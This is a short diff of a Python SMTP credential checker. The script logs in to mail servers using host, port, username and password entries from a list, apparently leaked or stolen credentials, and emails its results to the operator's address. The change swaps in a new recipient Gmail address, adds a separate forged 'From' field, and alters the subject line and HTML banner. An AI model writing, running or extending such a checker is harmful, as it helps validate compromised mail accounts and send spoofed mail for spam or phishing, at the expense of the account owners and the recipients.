@@ -55,11 +55,11 @@ class bcolors:
 VALIDS = 0
 INVALIDS = 0
 
-toaddr = "tuxmacgiv991@yahoo.com" #paste your mail
+toaddr = "eldiablo1337x@gmail.com" #paste your mail
 
 
 def check(smtp):
-    HOST, PORT, usr, pas = smtp.strip().split('|')
+    HOST, PORT, usr, pas, mail_from = smtp.strip().split('|')
     global VALIDS, INVALIDS
     try:
         server = smtplib.SMTP(HOST, PORT)
@@ -67,8 +67,8 @@ def check(smtp):
         server.starttls()
         server.login(usr, pas)
         msg = MIMEMultipart()
-        msg['Subject'] = "CHECKER RESULT : v3"
-        msg['From'] = usr
+        msg['Subject'] = "CHECKER RESULT HEHEOLD"
+        msg['From'] = mail_from
         msg['To'] = toaddr
         msg.add_header('Content-Type', 'text/html')
         data = """
@@ -130,7 +130,7 @@ def check(smtp):
         <body>
             <div class="container" >
             <a href="https://www.facebook.com/tux.facg1v/">
-            "MAIL FROM - Tux MacG1v"
+            "EEQ EEQ EEQ"
              </a>
             </div>
             <div class="cont2">
